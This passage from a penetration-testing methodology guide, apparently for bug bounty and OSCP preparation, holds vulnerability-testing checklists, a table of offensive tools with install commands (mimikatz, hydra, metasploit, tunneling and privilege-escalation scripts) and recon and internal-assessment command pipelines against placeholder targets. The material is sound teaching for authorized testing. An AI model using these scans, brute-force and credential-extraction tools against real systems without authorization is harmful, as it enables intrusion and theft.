+Test ORM injection
+Test XML injection
+Test SSI injection
+Test XPath injection
+Test IMAP/SMTP injection
+Test code injection
+Test OS command injection
+Test buffer overflow
+Test incubated vulnerability
+Test HTTP splitting/smuggling
+Test HTTP request smuggling
+Phase 8: Error Handling
+Test error codes
+Test stack traces
+Phase 9: Cryptography
+Test weak transport layer security
+Test padding oracle
+Test sensitive information sent via unencrypted channels
+Phase 10: Business Logic Testing
+Test business logic data validation
+Test ability to forge requests
+Test integrity checks
+Test process timing
+Test number of times a function can be used
+Test CAPTCHA
+Test payment functionality
+Phase 11: Client-side Testing
+Test DOM-based cross-site scripting
+Test JavaScript execution
+Test HTML injection
+Test client-side URL redirect
+Test CSS injection
+Test client-side resource manipulation
+Test cross-origin resource sharing
+Test cross-site flashing
+Test clickjacking
+Test web messaging
+Test local storage
+Phase 12: API Testing
+Test API endpoint security
+Test API authentication
+Test API authorization
+Test API input validation
+Test API rate limiting
+9.4 Testing Types
+Black Box Testing
+No prior knowledge of target
+Simulates external attacker
+Time-consuming but realistic
+May miss internal vulnerabilities
+Grey Box Testing
+Limited knowledge (credentials, basic architecture)
+Most common approach
+Balances realism with efficiency
+Tests access control and lateral movement
+White Box Testing
+Full knowledge (source code, documentation)
+Most thorough analysis
+Identifies root causes
+Does not simulate real attacker
+Red Team vs Penetration Test
+Penetration Test: Time-boxed, scoped, cooperative
+Red Team: Extended duration, broader scope, stealthy, tests detection/response
+10. Essential Tools Reference
+10.1 Reconnaissance Tools
+Tool
+Purpose
+Installation
+subfinder
+Passive subdomain enumeration
+go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+amass
+Comprehensive subdomain enumeration
+go install github.com/owasp-amass/amass/v4/...@master
+assetfinder
+Subdomain discovery (crt.sh + Facebook CT)
+go install github.com/tomnomnom/assetfinder@latest
+httpx
+Live host probing
+go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+shuffledns
+MassDNS wrapper for subdomain brute force
+go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
+massdns
+High-speed DNS resolver
+git clone https://github.com/blechschmidt/massdns.git
+puredns
+Fast domain resolver with wildcard filtering
+go install github.com/d3mondev/puredns/v2@latest
+altdns
+Subdomain permutation generator
+pip install py-altdns
+gotator
+Advanced subdomain permutation
+go install github.com/Josue87/gotator@latest
+dnsx
+DNS toolkit
+go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+gau
+URL fetcher (AlienVault, Wayback, etc.)
+go install github.com/lc/gau/v2/cmd/gau@latest
+waybackurls
+Wayback Machine URL fetcher
+go install github.com/tomnomnom/waybackurls@latest
+katana
+Web crawler
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+nuclei
+Vulnerability scanner
+go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+naabu
+Port scanner
+go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+10.2 Content Discovery Tools
+Tool
+Purpose
+Installation
+ffuf
+Fast web fuzzer
+go install github.com/ffuf/ffuf/v2@latest
+feroxbuster
+Rust-based content discovery
+cargo install feroxbuster
+gobuster
+Directory/file/DNS brute forcer
+go install github.com/OJ/gobuster/v3@latest
+dirsearch
+Python-based directory brute forcer
+git clone https://github.com/maurosoria/dirsearch.git
+arjun
+HTTP parameter discovery
+pip install arjun
+paramspider
+Parameter discovery from URLs
+git clone https://github.com/devanshbatham/ParamSpider.git
+xnLinkFinder
+Link finder from JS files
+git clone https://github.com/xnl-h4ck3r/xnLinkFinder.git
+jsluice
+JavaScript analysis
+go install github.com/BishopFox/jsluice/...
+burp suite
+Web proxy and scanner
+https://portswigger.net/burp/communitydownload
+owasp zap
+Web proxy and scanner
+https://www.zaproxy.org/download/
+nikto
+Web server scanner
+apt install nikto
+10.3 Port Scanning & Network Tools
+Tool
+Purpose
+Installation
+nmap
+Network scanner
+apt install nmap
+masscan
+High-speed port scanner
+git clone https://github.com/robertdavidgraham/masscan.git
+rustscan
+Fast port scanner
+cargo install rustscan
+naabu
+Go port scanner
+See above
+wireshark
+Network protocol analyzer
+apt install wireshark
+tcpdump
+Packet analyzer
+apt install tcpdump
+netcat
+Network utility
+apt install netcat
+impacket
+Python network protocols
+pip install impacket
+10.4 Web Application Testing Tools
+Tool
+Purpose
+Installation
+burp suite
+Web proxy/scanner
+See above
+sqlmap
+SQL injection automation
+git clone https://github.com/sqlmapproject/sqlmap.git
+ghauri
+Modern SQL injection tool
+pip install ghauri
+dalfox
+XSS scanner
+go install github.com/hahwul/dalfox/v2@latest
+xsstrike
+XSS detection suite
+git clone https://github.com/s0md3v/XSStrike.git
+wafw00f
+WAF detection
+pip install wafw00f
+whatweb
+Technology fingerprinting
+apt install whatweb
+gowitness
+Screenshotting
+go install github.com/sensepost/gowitness@latest
+aquatone
+Screenshotting
+go install github.com/michenriksen/aquatone@latest
+10.5 API Testing Tools
+Tool
+Purpose
+Installation
+postman
+API testing platform
+https://www.postman.com/downloads/
+insomnia
+API testing client
+https://insomnia.rest/download
+httpie
+Command-line HTTP client
+apt install httpie
+jwt_tool
+JWT testing toolkit
+git clone https://github.com/ticarpi/jwt_tool.git
+inql
+GraphQL testing
+pip install inql
+graphqlmap
+GraphQL exploitation
+git clone https://github.com/swisskyrepo/GraphQLmap.git
+10.6 Cloud & Infrastructure Tools
+Tool
+Purpose
+Installation
+s3scanner
+S3 bucket enumeration
+pip install s3scanner
+cloud_enum
+Multi-cloud enumeration
+git clone https://github.com/initstring/cloud_enum.git
+gcpbucketbrute
+GCP bucket enumeration
+git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
+trufflehog
+Secret scanning
+pip install truffleHog
+gitleaks
+Secret scanning
+go install github.com/zricethezav/gitleaks/v8@latest
+gitdorker
+GitHub dorking
+git clone https://github.com/obheda12/GitDorker.git
+asnmap
+ASN enumeration
+go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest
+shodan
+Internet scanner
+pip install shodan
+censys
+Internet scanner
+pip install censys
+10.7 Post-Exploitation & Privilege Escalation Tools
+Tool
+Purpose
+Installation
+linpeas
+Linux privesc enumeration
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+winpeas
+Windows privesc enumeration
+Download from PEASS-ng releases
+linenum
+Linux enumeration
+git clone https://github.com/rebootuser/LinEnum.git
+linux-exploit-suggester
+Kernel exploit suggestions
+git clone https://github.com/mzet-/linux-exploit-suggester.git
+seatbelt
+Windows enumeration
+git clone https://github.com/GhostPack/Seatbelt.git
+powerup
+Windows privesc checks
+Included in PowerSploit
+bloodhound
+AD visualization
+apt install bloodhound
+sharphound
+AD data collector
+Download from BloodHound releases
+mimikatz
+Credential extraction
+https://github.com/gentilkiwi/mimikatz/releases
+netexec
+Network exploitation
+pip install netexec
+chisel
+TCP tunneling
+go install github.com/jpillora/chisel@latest
+ligolo-ng
+Advanced tunneling
+go install github.com/nicocha30/ligolo-ng/cmd/ligolo-ng@latest
+proxychains
+Proxy chaining
+apt install proxychains4
+metasploit
+Exploitation framework
+apt install metasploit-framework
+10.8 Password Cracking & Brute Force
+Tool
+Purpose
+Installation
+hashcat
+Password cracking
+apt install hashcat
+john (jtr)
+Password cracking
+apt install john
+hydra
+Network login brute force
+apt install hydra
+medusa
+Parallel login brute force
+apt install medusa
+burp suite intruder
+Web login brute force
+See above
+ffuf
+Web fuzzing/brute force
+See above
+10.9 Useful Wordlists
+# SecLists (comprehensive wordlists)git clone https://github.com/danielmiessler/SecLists.git# Key wordlists:# /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt# /usr/share/seclists/Discovery/Web-Content/common.txt# /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt# /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt# /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt# PayloadsAllTheThings (payload collections)git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git# FuzzDB (fuzzing payloads)git clone https://github.com/fuzzdb-project/fuzzdb.git
+10.10 GTFOBins & LOLBAS
+GTFOBins: Unix binaries that can be exploited for privesc
+URL: https://gtfobins.github.io/
+Usage: Search for SUID binary name, get exploitation command
+LOLBAS: Living Off The Land Binaries (Windows)
+URL: https://lolbas-project.github.io/
+Usage: Search for Windows binary, get abuse techniques
+APPENDIX: Quick Reference Commands
+Full Recon Pipeline (One-liner style)
+# Complete subdomain enumeration pipelinesubfinder -d target.com -all -silent | amass enum -passive -d target.com -silent | assetfinder --subs-only target.com | sort -u | shuffledns -d target.com -r resolvers.txt -mode resolve | httpx -status-code -title -tech-detect | tee all_subdomains.txt# Port scan all live hostscat all_subdomains.txt | naabu -p - -o ports.txt# Content discovery on all web hostscat all_subdomains.txt | ffuf -u https://FUZZ/FUZZ2 -w -:FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ2 -mc 200,301,302,403# Vulnerability scannuclei -list all_subdomains.txt -severity critical,high -o vulns.txt
+OSCP-like Internal Assessment
+# 1. Network discoverynmap -sn 192.168.1.0/24 -oG hosts.txt# 2. Port scan live hostsnmap -sC -sV -p- -iL live_hosts.txt -oN full_scan.txt# 3. Service enumeration# (Use NSE scripts based on services found)# 4. Web enumeration# (Use ffuf, gobuster, nikto on web services)# 5. Exploitation# (Use Metasploit, manual exploitation)# 6. Post-exploitation# (Upload LinPEAS/WinPEAS, run them)# (Use BloodHound for AD environments)# 7. Reporting# (Document everything with screenshots)
+REFERENCES & SOURCES
+This methodology guide was compiled from the following authoritative sources:
+OWASP Web Security Testing Guide (WSTG) - https://owasp.org/www-project-web-security-testing-guide/
+Penetration Testing Execution Standard (PTES) - http://www.pentest-standard.org/
+NIST SP 800-115 - Technical Guide to Information Security Testing
+ProjectDiscovery Tools Documentation - https://docs.projectdiscovery.io/
+Nmap Reference Guide - https://nmap.org/book/
+OWASP API Security Top 10 - https://owasp.org/API-Security/
+HackTricks - https://book.hacktricks.xyz/
+PayloadsAllTheThings - https://github.com/swisskyrepo/PayloadsAllTheThings
+GTFOBins - https://gtfobins.github.io/
+LOLBAS Project - https://lolbas-project.github.io/
+Document Version: 1.0 Compiled: 2025/2026 Purpose: Complete reference for penetration testing, bug bounty hunting, and OSCP preparation
